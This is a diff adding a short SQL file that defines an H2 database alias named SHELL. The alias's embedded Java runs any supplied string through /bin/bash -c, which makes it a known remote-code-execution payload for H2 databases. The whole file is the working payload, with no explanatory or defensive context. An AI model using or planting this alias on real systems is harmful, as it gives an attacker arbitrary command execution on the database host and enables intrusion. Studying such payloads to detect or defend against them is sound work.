@@ -1,0 +1,5 @@
+CREATE ALIAS SHELL AS $$ String shell(String cmd) throws java.io.IOException { 
+	new ProcessBuilder ("/bin/bash","-c", cmd).start ();
+	return "ok";
+} $$;
+
